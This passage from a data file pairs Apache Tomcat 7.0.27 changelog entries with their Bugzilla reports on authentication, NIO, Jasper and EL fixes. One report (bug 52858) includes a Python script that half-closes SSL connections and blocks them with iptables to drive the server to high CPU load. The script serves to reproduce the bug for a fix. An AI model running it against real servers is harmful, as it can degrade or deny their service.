	at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
	at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
	at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
	at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
	at org.apache.maven.cli.MavenCli.execute(MavenCli.java:544)
	at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:197)
	at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
	at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
	at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
	at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52833
Catalina|Tomcat 7.0.27 (markt)|add|52839|Add a unit test for DigestAuthenticator and SingleSignOn. Patch provide by Brian Burch. (markt)|New unit test for DigestAuthenticator and SingleSignOn|"Created attachment 28425 [details]
complete new class file

New test class for SingleSignOn and the Digest Authenticator. Code passes validation and executes successfully against trunk svn commit: r1297158."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52839
Catalina|Tomcat 7.0.27 (markt)|fix|52846|Make sure NonLoginAuthenticator registers not MemoryUser but GenericPrincipal into a session when UserDatabaseRealm is used. (kfujino)|Programmatic login using UserDatabaseRealm returns 403 error.|"IMHO,HttpServletRequest#login does not need to define a <login-config>.
NonLoginAuthenticator is used when <login-config> is not specified in HttpServletRequest#login. 

When UserDatabaseRealm is used, not GenericPrincipal but Memory User is set to a session.
In AuthenticatorBase#invoke, principal registered into a session is set to a request. 
Because MemoryUser is set to a request as principal, RealmBase#hasRole always returns false. 
As a result, 403 error is returned."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52846
Catalina|Tomcat 7.0.27 (markt)|add|52850|Extend memory leak prevention and detection code to work with IBM as well as Oracle JVMs. Extend unit tests to check direct and indirect ThreadLocal memory leak detection. Based on a patch provided by Rohit Kelapure. (markt)|Various miscellaneous fixes to Tomcat Memory Leak Detection code|"Problem Description - 
----------------------
Tomcat memory leak detection has the following issues
- Most of the detection and fixing code has been tested ONLY on Sun JVMs. A lot of  the reflection based code does not work with the IBM JDK. 
- Tests in tomcat7.source\test\org\apache\catalina\loader do not seem to run successfully and are incomplete for all the protection that Tomcat provides for classloader memory leaks.
- For some categories of threadlocal memory leaks the key and value are not displayed correctly in the warning messages; particularly ones dealing with indirect references to threadlocals
-  org.apache.catalina.loader.WebappClassLoader.loadedByThisOrChild(Object) incorrectly traverses the object classloader hierarchy instead of the current (this) classloader hierarchy

Problem Conclusion - 
--------------------
- After extensive testing with the IBM JDKs, I have cleaned up and sanitized some of the reflection code to stop executors, timers, threads etc on the IBM JDK
- Added new tests for detecting threadlocal leaks and thread leaks
- Better ThreadLocal leak reporting with corrected loadedByThisOrChild method and addition of expungeStaleEntries method
- Make code more resilient in certain leak detection scenarios."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52850
Catalina|Tomcat 7.0.27 (markt)|add||Add support for the WebSocket protocol (RFC6455). Both streaming and message based APIs are provided and the implementation currently fully passes the Autobahn test suite. Also included are several examples. A significant contribution to this new functionality was provided by Johno Crawford ‚Äî particularly the examples. Contributions were also provided by Petr Praus, Jonathan Drake & Sl√°vka. (markt)|||
Catalina|Tomcat 7.0.27 (markt)|fix||When stopping a Context, ensure that any Servlets registered with JMX are unregistered. (markt)|||
Catalina|Tomcat 7.0.27 (markt)|code||Make the implementation of Catalina.getParentClassLoader consistent with similar methods across the code base and have it return the system class loader if no parent class loader is set. (markt)|||
Catalina|Tomcat 7.0.27 (markt)|fix|52953|Ensure users can authenticate when using DIGEST authentication with digested passwords if the digested password is stored using upper case hexadecimal characters since DIGEST authentication expects digests to use lower case characters. Based on a patch provided by Neale Rudd. (markt)|Unlike BASIC Authentication, DIGEST mode does not work if the hash is stored in uppercase.|"Created attachment 28487 [details]
patch against the current 8.0.0-dev trunk adding toLowerCase on hash retrieval

Unlike BASIC Authentication, DIGEST mode does not work if the hash is stored in uppercase.

This is not a problem if the hashes are generated by CATALINA/bin/digest.sh, but if they are prepared with other software which generate uppercase hex strings for hashes, it can be very confusing trying to figure out why digest authentication is not working.

The other hash comparisons use equalsIgnoreCase() to compare the hashes, but the digest version of RealmBase.authenticate() prepares the serverDigestValue by taking the Principal's hash (as is) and prepending it to the nonce and other digest fields, and then rehashing.

As a result, the final hash serverDigest is not the same as the clientDigest value that comes from the browser.

To test, change an MD5 DIGEST hash to upper case and attempt to authenticate.

The provided one-line patch against the current 8.0.0-dev trunk simply uses toLowerCase on the retrieved server-side hash.

Best Regards,
Neale Rudd"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52953
Catalina|Tomcat 7.0.27 (markt)|fix|52957|Ensure that a Valve implements Lifecycle before calling any Lifecycle methods on that Valve. (markt)|ClassCastException while removing Valve|"Created attachment 28490 [details]
Patch proposal

Hello,

The exception below is thrown when StandardPipeline.removeValve() is invoked:

Caused by: java.lang.ClassCastException: test.MyValve cannot be cast to org.apache.catalina.Lifecycle
	at org.apache.catalina.core.StandardPipeline.removeValve(StandardPipeline.java:461)
	at org.apache.catalina.core.StandardPipeline.destroyInternal(StandardPipeline.java:222)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:304)


test.MyValve implements only Valve

I'm attaching a patch made against 7.0.x. Please review it and comment it.

Thanks in advance.
Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52957
Catalina|Tomcat 7.0.27 (markt)|fix|52958|Fix MBean descriptors for org.apache.catalina.realm package. (markt)|not valid xml in mbeans-descriptors.xml|"in src

apache-tomcat-7.0.25-src and apache-tomcat-7.0.26-src

\java\org\apache\catalina\realm\mbeans-descriptors.xml

have not valid xml file

--------
<attribute   name=""useContextClassLoader""
          description=""Sets whether to use the context or default ClassLoader.""
                   is=""true""/>
                 type=""boolean""/>

    <attribute   name=""validate""
          description=""Should we validate client certificate chains when they are presented?""
                 type=""boolean""/>

------------

""type=""boolean""/>"" this incorrect

___

P.S. Sorry, i am bad speek english."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52958
Catalina|Tomcat 7.0.27 (markt)|fix|52974|Fix NameNotFoundException when field/method is annotated with @Resource annotation. Patch provided by Violet Agg. (markt)|NameNotFoundException is thrown when field/method is annotated with @Resource annotation|"Created attachment 28500 [details]
Patch proposal

Hi,

I have a web application (attached) that has a Servlet with an annotated (@Resource) field and an annotated (@Resource) method.

When I request the Servlet I'm receiving:

javax.naming.NameNotFoundException: Name test.TestServlet is not bound in this Context
  org.apache.naming.NamingContext.lookup(NamingContext.java:820)
  org.apache.naming.NamingContext.lookup(NamingContext.java:168)
  org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
  org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)


I searched the sources and found that org.apache.catalina.startup.WebAnnotationSet processes and prepares for binding only @Resource annotation on a class level. However org.apache.catalina.core.DefaultInstanceManager tries to process @Resource annotation on field/method level and to inject the necessary Object. Unfortunately as the information is not processed and bound in the naming previously, NameNotFoundException is thrown.

I would like to propose a patch (attached).

I'm looking forward to your comments.

Thanks in advance.

Regards
Violeta Georgieva


Steps to reproduce the issue:

1. Deploy the attached web application
2. Request http://localhost:8080/test/TestServlet
3. NameNotFoundException is thrown
4. Apply the patch and restart Tomcat
5. Request http://localhost:8080/test/TestServlet
6. You should see in the browser ""Annotated field: test Annotated method: test1"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=52974
Catalina|Tomcat 7.0.27 (markt)|add||Add support for multi-thread deployment in UserConfig. (kfujino)|||
Coyote|Tomcat 7.0.27 (markt)|fix||Correctly register NIO sockets with poller after processing Comet events to ensure that no read events are missed. This fixes an intermittent issue observed in the unit tests. (fhanik/markt)|||
Coyote|Tomcat 7.0.27 (markt)|fix|52770|Fix a bug in the highly unlikely circumstance that an infinite timeout was specified for writing data to a client when using NIO. (markt)|Potential Bug or Inconsistency in NioBlockingSelector.java|"This is Ken Cheung, a Computer Science M.Phil. student. I observed some
code clones in Tomcat and found inconsistent code:

/tomcat/trunk/java/org/apache/tomcat/util/net/NioBlockingSelector.java

103	                try {
104	                    if ( att.getWriteLatch()==null || att.getWriteLatch().getCount()==0) att.startWriteLatch(1);
105	                    poller.add(att,SelectionKey.OP_WRITE,reference);
106	                    att.awaitWriteLatch(writeTimeout,TimeUnit.MILLISECONDS);
107	                }catch (InterruptedException ignore) {
108	                    Thread.interrupted();
109	                }
110	                if ( att.getWriteLatch()!=null && att.getWriteLatch().getCount()> 0) {
111	                    //we got interrupted, but we haven't received notification from the poller.
112	                    keycount = 0;
113	                }else {
114	                    //latch countdown has happened
115	                    keycount = 1;
116	                    att.resetWriteLatch();
117	                }
118	
119	                if (writeTimeout > 0 && (keycount == 0))
120	                    timedout = (System.currentTimeMillis() - time) >= writeTimeout;

/tomcat/trunk/java/org/apache/tomcat/util/net/NioBlockingSelector.java

164	                try {
165	                    if ( att.getReadLatch()==null || att.getReadLatch().getCount()==0) att.startReadLatch(1);
166	                    poller.add(att,SelectionKey.OP_READ, reference);
167	                    if (readTimeout < 0) {
168	                        att.awaitReadLatch(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
169	                    } else {
170	                        att.awaitReadLatch(readTimeout, TimeUnit.MILLISECONDS);
171	                    }
172	                }catch (InterruptedException ignore) {
173	                    Thread.interrupted();
174	                }
175	                if ( att.getReadLatch()!=null && att.getReadLatch().getCount()> 0) {
176	                    //we got interrupted, but we haven't received notification from the poller.
177	                    keycount = 0;
178	                }else {
179	                    //latch countdown has happened
180	                    keycount = 1;
181	                    att.resetReadLatch();
182	                }
183	                if (readTimeout >= 0 && (keycount == 0))
184	                    timedout = (System.currentTimeMillis() - time) >= readTimeout;

Quick description of the inconsistency
Two code snippets are very similar code, but as you see, the first code does not check ""if (readTimeout < 0)"" while the second code has the checker.

We thought it could be a potential bug or inconsistency. Hope this helps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52770
Coyote|Tomcat 7.0.27 (markt)|fix|52858|Fix high CPU load with SSL, NIO and sendfile when client breaks the connection before reading all the requested data. (markt)|High CPU load in the NIO connector, when a client breaks connection unexpectedly|"How to reproduce:
Tomcat with the NIO connector, using HTTPS scheme, when a client requests for
some quite a big (~100K-200K) static file, and breaks the connection
unexpectedly.
Here is the python script to reproduce the problem:

# The way to reproduce the bug in the Tomcat NIO connector.
# Install python-iptables from https://github.com/ldx/python-iptables/downloads
# Author: Dmitry Kukushkin (dmitry.kukushkin at external.telekom.de)
from threading import Thread
from threading import Lock
from socket import *
from select import *
from time import *
from traceback import *
import ssl
import sys
import iptc

blockedPorts = dict()

getCssRequest = """"""GET /<some big file> HTTP/1.1\r
Host: <host>:<port>\r
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A406\r
Accept: text/css,*/*;q=0.1\r
Accept-Language: de-de\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r\n
\r\n
""""""

class Client(Thread):
    def __init__(self, tid, lock):
        Thread.__init__(self)
        self.lock = lock
        self.tid = tid

    def run(self):
        print ""Starting thread %d"" % self.tid
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            sslSocket = ssl.wrap_socket(clientSocket)
            
            remoteAddr = (<host>, <port>)
            sslSocket.connect(remoteAddr)
            localAddr, localPort =  sslSocket.getsockname()
            print ""New socket created tid=%d, sfd=%d, sport=%d"" % ( self.tid, clientSocket.fileno(), localPort )
            self.deleteFirewallRule(localPort, self.lock)
            
            sslSocket.send(getCssRequest)
            data = sslSocket.recv(1024)
            ''' Put the socket into half - closed state '''
            clientSocket.shutdown(SHUT_WR)
            clientSocket.close()
            self.createFirewallRule(localPort, self.lock)
        except Exception, e:
           print ""Error: "", e
           print_exc()

    @staticmethod
    def createFirewallRule(port, lock):
        lock.acquire()
        print ""Creating the iptables rule for port %d"" % port
        rule = iptc.Rule()
        rule.protocol = ""tcp""
        rule.target = iptc.Target(rule, ""REJECT"")

        match = iptc.Match(rule, ""tcp"")
        match.sport = ""%s"" % port
        rule.add_match(match)
            
        chain = iptc.Chain(iptc.TABLE_FILTER, ""OUTPUT"")
        chain.insert_rule(rule)
        rule.target.reset()
        blockedPorts[port] = rule
        lock.release()
    
    @staticmethod
    def deleteFirewallRule(port, lock):
        lock.acquire()
        if port in blockedPorts:
            print ""Deleteng the iptables rule for port %d"" % port
            rule = blockedPorts[port]
            chain = iptc.Chain(iptc.TABLE_FILTER, ""OUTPUT"")
            chain.delete_rule(rule)
            chain.flush()
            del blockedPorts[port]
        lock.release()
        
if __name__ == ""__main__"":
    
    if len(sys.argv) == 1 :
        print ""Problem.py <number of threads>""
        exit(0)
    clients = []
    lock = Lock()
    for i in range( int(sys.argv[1]) ):
        c = Client(i, lock)
        clients.append(c)
        c.start()
        
    print ""Joining""
    for i in clients:
        i.join()

The client shutdowns the socket, thus making connection half-closed, and disappears (is blocked by firewall in case of this script). This results in a high CPU load:
Servers polls the socket descriptor for both reading and writing, and gets EPOLLIN event on this half-closed connection, then it is trying to write, failing with EAGAIN, polling sd for writing and reading events again, getting EPOLLIN, trying to write... and so on, as you can see from the attached strace snippet:
...
[pid 26206] epoll_ctl(50, EPOLL_CTL_DEL, 51, {0, {u32=51, u64=34359738419}}) = 0
[pid 26206] gettimeofday({1331211762, 650946}, NULL) = 0
[pid 26206] epoll_wait(50,  <unfinished ...>
[pid 26199] <... epoll_wait resumed> {{EPOLLIN, {u32=40, u64=7266968735074746408}}}, 4096, 1000) = 1
[pid 26199] read(40, ""\1"", 128)         = 1
[pid 26199] gettimeofday({1331211762, 652745}, NULL) = 0
[pid 26199] epoll_wait(43,  <unfinished ...>
[pid 26206] <... epoll_wait resumed> {{EPOLLIN, {u32=48, u64=6182845940760624}}}, 4096, 1000) = 1
[pid 26206] read(48, ""\1"", 128)         = 1
[pid 26206] gettimeofday({1331211762, 675214}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675294}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675378}, NULL) = 0
[pid 26206] epoll_ctl(50, EPOLL_CTL_ADD, 51, {EPOLLOUT, {u32=51, u64=51}}) = 0
[pid 26206] epoll_ctl(50, EPOLL_CTL_MOD, 51, {EPOLLIN|EPOLLOUT, {u32=51, u64=7255244058472218675}}) = 0
[pid 26206] gettimeofday({1331211762, 675570}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 675699}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675761}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 675925}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675979}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 676082}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676144}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 676273}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676327}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 676429}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676476}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 676609}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676671}, NULL) = 0
...

Possible solution:
Check if EPOLLOUT event has arrived before attempting to send the file:
--- apache-tomcat-7.0.26-src/java/org/apache/tomcat/util/net/NioEndpoint.java
+++ apache-tomcat-7.0.26-src/java/org/apache/tomcat/util/net/NioEndpoint.java
@@ -1205,7 +1205,7 @@
                     sk.attach(attachment);//cant remember why this is here
                     NioChannel channel = attachment.getChannel();
                     if (sk.isReadable() || sk.isWritable() ) {
-                        if ( attachment.getSendfileData() != null ) {
+                        if ( sk.isWritable() && attachment.getSendfileData() != null ) {
                             processSendfile(sk,attachment,true, false);
                         } else if ( attachment.getComet() ) {
                             //check if thread is available"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52858
Coyote|Tomcat 7.0.27 (markt)|fix|52926|Avoid NPE when an NIO Comet connection times out on one thread at the same time as it is closed on another thread. (markt)|NPE in processSocket|"We have sporadic issues triggering 502 proxy errors using the NIO connector behind Nginx, caused by dropped connections/end of streams in Tomcat. The Tomcat log shows:

SEVERE: Error allocating socket processor
java.lang.NullPointerException 
at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:721)
at org.apache.tomcat.util.net.NioEndpoint$Poller.cancelledKey(NioEndpoint.java:1048)
at org.apache.tomcat.util.net.NioEndpoint$Poller.timeout(NioEndpoint.java:1392)
at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1174)
at java.lang.Thread.run(Thread.java:662)

Looking at the code in processSocket I see the line in NioEndpoint(721): 
attachment.setCometNotify(false); //will get reset upon next reg

Attachment is fetched in line 720:
KeyAttachment attachment = (KeyAttachment)socket.getAttachment(false);

Looking at socket.getAttachement() method I see that this method is indeed capable of returning null, but no null-check for this is done (although it is in multiple other locations, so it seems inconsistent)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52926
Coyote|Tomcat 7.0.27 (markt)|add||Include port number when known in connector name when logging messages from connectors that use automatic free port allocation. (markt)|||
Coyote|Tomcat 7.0.27 (markt)|fix||Don't try an unlock the acceptor thread if it is not locked. This is unlikely to impact normal usage but it does fix some unit test issues. (markt)|||
Coyote|Tomcat 7.0.27 (markt)|fix||When using the APR connector ensure that any connections in a keep-alive state are closed when the connector is stopped rather than when the connector is destroyed. This is important when stop() followed by start() is called on the connector. (markt)|||
Jasper|Tomcat 7.0.27 (markt)|fix|52725|Use configurable package name for tags rather than hard-coded value so configuration actually works. (markt)|org.apache.jasper.compiler.JspUtil#getTagHandlerClassName() does not use org.apache.jasper.Constants.TAG_FILE_PACKAGE_NAME|"In the class org.apache.jasper.compiler.JspUtil, its method 

    public static String getTagHandlerClassName(String path, String urn,
            ErrorDispatcher err) throws JasperException {
        ...
    }

uses the string constants directly like ""org.apache.jsp.tag.web."", ""org.apache.jsp.tag.meta."".

But you know there is TAG_FILE_PACKAGE_NAME field in the class org.apache.jasper.Constants.


The code should be adjusted like below :

Constants.TAG_FILE_PACKAGE_NAME + "".web""
Constants.TAG_FILE_PACKAGE_NAME + "".meta"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=52725
Jasper|Tomcat 7.0.27 (markt)|code|52758|Implement additional interface methods in Eclipse JDT integration required for Jasper to correctly with the latest Eclipse development code. (markt)|Jasper illegally implements org.eclipse.jdt.internal.compiler.env.ICompilationUnit from Eclipse|"The illegal implementation described in the Eclipse bug (https://bugs.eclipse.org/bugs/show_bug.cgi?id=372351) is causing severe problems for the Eclipse SDK which uses Jasper for our help system. 

The interface in question is org.eclipse.jdt.internal.compiler.env.ICompilationUnit which resides in an internal package and should not be implemented by clients. The ideal resolution to this problem would be for Jasper to discontinue implementing it, but we would also be fine with Jasper just updating their code to resolve the compilation problems."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52758
Jasper|Tomcat 7.0.27 (markt)|fix|52772|Ensure uriRoot is fully validated before it is used. Patch based on a suggestion by Eugene Chung. (markt)|JspC : checking uriRoot option validness|"In org.apache.jasper.JspC#execute() method,
if uriRoot is not null,
it scans all jsp files under uriRoot,
and then checks if uriRoot is a directory.

It should be more desirable to check if uriRoot is a directory or not first and then scanning it.


Here are my suggestion.

            if (uriRoot == null) {
                throw new JasperException(
                    Localizer.getMessage(""jsp.error.jspc.no_uriroot""));
            }

            File uriRootF = new File(uriRoot);
            if (!uriRootF.exists() || !uriRootF.isDirectory()) {
                throw new JasperException(
                    Localizer.getMessage(""jsp.error.jspc.uriroot_not_dir""));
            }

            if( context==null ) {
                initServletContext();
            }

            // No explicit pages, we'll process all .jsp in the webapp
            if (pages.size() == 0) {
                scanFiles(uriRootF);
            }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52772
Jasper|Tomcat 7.0.27 (markt)|fix|52776|Refactor the code so JspFragment.invoke cleans up after itself. Patch provided by Karl von Randow. (markt)|Generator's JspFragment.invoke implementation does not reset ELContext[JspContext.class]|"If a developer captures a JspFragment themselves and calls invoke on it, the JspContext.class attribute in the enclosing pageContext's ELContext is set by the generated JspFragment subclass, but not reset to its original value afterwards. Therefore after invoking a JspContext any EL expressions will be searching the wrong jspContext for attribute values.

org.apache.jasper.compiler.Generator is responsible for creating the JspFragment subclass to represent the compiled fragment. The generatePostamble() method emits generated code to set the JspContext attribute in the ELContext:

out.printil(""this.jspContext.getELContext().putContext(javax.servlet.jsp.JspContext.class,this.jspContext);"");

However it doesn't later put back the original value.

If you are using the <jsp:invoke> tag to invoke the fragment (which is undoubtedly what most people are doing) then the code generated by visit(Node.InvokeAction n) in Generator explicitly restores the EL context:

out.printil(""jspContext.getELContext().putContext(javax.servlet.jsp.JspContext.class,getJspContext());"");

However if you call invoke(Writer) on the JspFragment yourself you don't get that tidy up code.

I suggest the resolution is to have the JspFragment.invoke method tidy up after itself. It ""puts"" the change to the JspContext.class attribute so it should also re""put"" it. Then there shouldn't be any need to restore the EL context in the generated <jsp:invoke> code.

I have tested this solution successfully."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52776
Jasper|Tomcat 7.0.27 (markt)|fix|52970|Take account of coercion rules when invoking methods via EL. (markt)|MethodNotFoundException when using enum as one of method arguments|"Consider this JSF view snippet:

----------------------------------------------------------------------
<h:form>
    <h:commandButton value=""submit"" action=""#{bean.submit('FOO')}"" />
</h:form>
----------------------------------------------------------------------

And this JSF bean snippet:

----------------------------------------------------------------------
@ManagedBean
@RequestScoped
public class Bean {
    public enum Type { FOO, BAR }

    public void submit(Type type) {
        System.out.println(type);
    }
}
----------------------------------------------------------------------

This results in a javax.el.MethodNotFoundException. It works in Glassfish 3. EL 2.2 spec 1.18.6 tells that a string must be coerced to enum of type T."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52970
Jasper|Tomcat 7.0.27 (markt)|fix|52998|Partial fix. Remove static references to the EL expression factory and use per web application references instead. (markt)|Performance issue with ExpressionFactory.newInstance()|"javax.el.ExpressionFactory.newInstance() implementation in Tomcat 7 does not cache created instance and performs class name discovery on every invocation.

The discovery process involves looking for the file named
""META-INF/services/javax.el.ExpressionFactory"". So every invocation of the method involves looking for and maybe reading the file.


This issue was reported on the dev list, see thread:

[1] ""Two performance problems (found during myfaces testing)"", starting on 2012-03-08,
- http://tomcat.markmail.org/thread/7bbvzmkvyvryvn44
- http://marc.info/?t=133124021200002&r=1&w=2

The above thread [1] also references this one of myfaces:
[2] ""EL method invocation performance"", 2010-08-25:
- http://www.mail-archive.com/dev@myfaces.apache.org/msg48482.html

------------------
My evaluation is that
1. This problem is specific for Tomcat 7. - The ExpressionFactory.newInstance() method was added in EL 2.2 and Tomcat 6 does not have it.

2. It hits javax.el.BeanELResolver#invoke() the most, as ExpressionFactory.newInstance() is called on each invocation.

3. There are 2 places where the factory instance is stored in a static field. This is good for performance, but breaks the discovery process and may cause consequences if implementation is bundled in a web application. It is a bug. The places:

 org.apache.jasper.runtime.JspApplicationContextImpl.expressionFactory
 org.apache.jasper.compiler.Validator$ValidateVisitor.EXPRESSION_FACTORY"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52998
Jasper|Tomcat 7.0.27 (markt)|fix|52998|Remainder of fix. Cache the class to use for the EL expression factory per class loader. (kkolinko)|Performance issue with ExpressionFactory.newInstance()|"javax.el.ExpressionFactory.newInstance() implementation in Tomcat 7 does not cache created instance and performs class name discovery on every invocation.

The discovery process involves looking for the file named
""META-INF/services/javax.el.ExpressionFactory"". So every invocation of the method involves looking for and maybe reading the file.


This issue was reported on the dev list, see thread:

[1] ""Two performance problems (found during myfaces testing)"", starting on 2012-03-08,
- http://tomcat.markmail.org/thread/7bbvzmkvyvryvn44
- http://marc.info/?t=133124021200002&r=1&w=2

The above thread [1] also references this one of myfaces:
[2] ""EL method invocation performance"", 2010-08-25:
- http://www.mail-archive.com/dev@myfaces.apache.org/msg48482.html

------------------
My evaluation is that
1. This problem is specific for Tomcat 7. - The ExpressionFactory.newInstance() method was added in EL 2.2 and Tomcat 6 does not have it.

2. It hits javax.el.BeanELResolver#invoke() the most, as ExpressionFactory.newInstance() is called on each invocation.

3. There are 2 places where the factory instance is stored in a static field. This is good for performance, but breaks the discovery process and may cause consequences if implementation is bundled in a web application. It is a bug. The places:

 org.apache.jasper.runtime.JspApplicationContextImpl.expressionFactory
 org.apache.jasper.compiler.Validator$ValidateVisitor.EXPRESSION_FACTORY"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52998
Jasper|Tomcat 7.0.27 (markt)|fix|53001|Revert the fix for 46915 since the use case described in the bug is invalid since it breaks the EL specification. (markt)|Behaviour of ResourceBundleELResolver|"I have discovered the the ResourceBundleELResolver from the tomcat el-api.jar behaves differently then the one from standard el-api.

The difference lays in the handling of missing properties. The tomcat version will not set the resolved property to true such that evaluation continues and finally an exception is thrown. This causes pages to crash if a property can not be found (which I think is kind of unacceptable for production sites).

The bahaviour was changed due to https://issues.apache.org/bugzilla/show_bug.cgi?id=46915.

I think that changing the standard behaviour of ""resolving"" an unbound property by just returning its key is to throwing an exception was a strong decision. I would strongly recommend of reintroducing the old bahviour and fixing the issue 46915 in a different way. If someone can point my to the requirements and corner cases related to 46915, I will gladly provide an implementation.

Until then, a workaround for everybody using jsf: Subclass the ResourceBundleELResolver and override its getValue(...) method. Change it such that it sets the PropertyResolved attribute to true before any exception might occur. Register this custom resolver in the faces-config.xml with <el-resolver>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53001
Cluster|Tomcat 7.0.27 (markt)|fix||Replicate principal in ClusterSingleSignOn. (kfujino)|||
Web applications|Tomcat 7.0.27 (markt)|fix|52760|Fix expires filter mime type in javascript examples. (rjung)|Mime type for javascript incorrect  in documentation|"The mime type for javascript for the expires by type filter is documented as text/javascript.  Tomcat actually serves javascript with the mime-type application/javascript.   


http://tomcat.apache.org/tomcat-7.0-doc/config/filter.html

Says
 <init-param>
    <param-name>ExpiresByType text/javascript</param-name>
    <param-value>access plus 1 month</param-value>
 </init-param>

Should say

 <init-param>
    <param-name>ExpiresByType application/javascript</param-name>
    <param-value>access plus 1 month</param-value>
 </init-param>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52760
Web applications|Tomcat 7.0.27 (markt)|fix|52842|Exception in MBeanDumper when dumping MBean for StandardThreadExecutor. (rjung)|MBeanDumper dumpBeans SEVERE: Error getting attribute while using JMXProxy servlet|"Hi, 

We have been using the following two JMXProxy URLs for monitoring without issue
in 6.0.29. 

http://localhost:8080/manager/jmxproxy/?qry=*:type=Executor,name=tomcatThreadPool


OK - Number of results: 1 

Name: Catalina:type=Executor,name=tomcatThreadPool 
modelerType: org.apache.tomcat.util.modeler.BaseModelMBean 
threadPriority: 5 
queueSize: 0 
corePoolSize: 4 
maxIdleTime: 60000 
threadRenewalDelay: 1000 
minSpareThreads: 4 
activeCount: 1 
maxThreads: 150 
completedTaskCount: 17 
maxQueueSize: 2147483647 
largestPoolSize: 5 
stateName: STARTED 
name: tomcatThreadPool 
poolSize: 3 
namePrefix: catalina-exec- 


http://localhost:8080/manager/jmxproxy/?qry=bean:name=eventingDataSource


OK - Number of results: 1 

Name: bean:name=eventingDataSource 
modelerType: org.apache.tomcat.jdbc.pool.DataSource 
MaxIdle: 100 
JdbcInterceptors:
org.apache.tomcat.jdbc.pool.interceptor.ConnectionState;org.apache.tomcat.jdbc.pool.interceptor.StatementFinalizer 
DefaultTransactionIsolation: -1 
ValidationQuery: SELECT 1 FROM dual 
TestOnConnect: false 
Password: Password not available as DataSource/JMX operation. 
AbandonWhenPercentageFull: 0 
TestOnReturn: false 
Username: xxxx 
NumActive: 0 
MinIdle: 10 
PoolSize: 4 
